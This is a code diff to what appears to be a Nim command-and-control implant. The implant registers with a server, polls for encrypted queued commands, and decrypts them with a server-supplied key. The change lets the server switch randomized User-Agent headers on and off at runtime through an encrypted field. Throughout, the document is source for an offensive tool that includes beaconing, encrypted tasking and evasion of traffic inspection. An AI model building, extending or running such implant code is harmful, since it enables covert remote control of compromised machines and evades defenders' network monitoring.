@@ -1,5 +1,5 @@
 import base64, json, puppy
-from strutils import split, toLowerAscii, replace
+from strutils import split, toLowerAscii, replace, parseBool
 from unicode import toLower
 from os import parseCmdLine
 import crypto
@@ -25,10 +25,11 @@ type
         resultPath* : string
         userAgent* : string
         cryptKey* : string
+        randomUserAgents: bool
+
 
 # we can define whether we want to use the randomized userAgents
 # initally its false, unless we specify otherwise in the complie command 
-const randomUserAgents {.booldefine.}: bool= false
 
 # define a function to pick random userAgents with each command
 proc getRandomUserAgent(): string =
@@ -64,7 +65,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
 
             # Only send ID header once listener is registered
             if li.id != "":
-                if randomUserAgents:
+                if li.randomUserAgents:
                     headers = @[
                             Header(key: "X-Identifier", value: li.id),
                             Header(key: "User-Agent", value: getRandomUserAgent())
@@ -72,11 +73,11 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
                 else:
                     headers = @[
                         Header(key: "X-Identifier", value: li.id),
-                        Header(key: "User-Agent", value: li.userAgent)
+                        Header(key: "User-Agent", value: li.userAgent),
                     ] 
 
             else:
-                if randomUserAgents:
+                if li.randomUserAgents:
                     headers = @[
                             Header(key: "User-Agent", value: getRandomUserAgent())
                         ]
@@ -96,7 +97,7 @@ proc doRequest(li : Listener, path : string, postKey : string = "", postValue : 
 
         # POST request
         else:
-            if randomUserAgents:
+            if li.randomUserAgents:
                 let req = Request(
                 url: parseUrl(target),
                 verb: "post",
@@ -143,6 +144,7 @@ proc init*(li: var Listener) : void =
         li.id = parseJson(res.body)["id"].getStr()
         li.cryptKey = xorString(base64.decode(parseJson(res.body)["k"].getStr()), xor_key)
         li.initialized = true
+        li.randomUserAgents = false
     else:
         li.initialized = false
 
@@ -171,7 +173,7 @@ proc postRegisterRequest*(li : var Listener, ipAddrInt : string, username : stri
         li.registered = true
 
 # Watch for queued commands via GET request to the task path
-proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
+proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
     var 
         res = doRequest(li, li.taskPath)
         cmdGuid : string
@@ -188,6 +190,9 @@ proc getQueuedCommand*(li : Listener) : (string, string, seq[string]) =
     # Otherwise, parse task and arguments (if any)
     else:
         try:
+            # check for userAgent status
+            li.randomUserAgents = parseBool(decryptData(parseJson(res.body)["s2"].getStr(), li.cryptKey).replace("\'", "\""))
+
             # Attempt to parse task (parseJson() needs string literal... sigh)
             var responseData = decryptData(parseJson(res.body)["t"].getStr(), li.cryptKey).replace("\'", "\"")
             var parsedResponseData = parseJson(responseData)
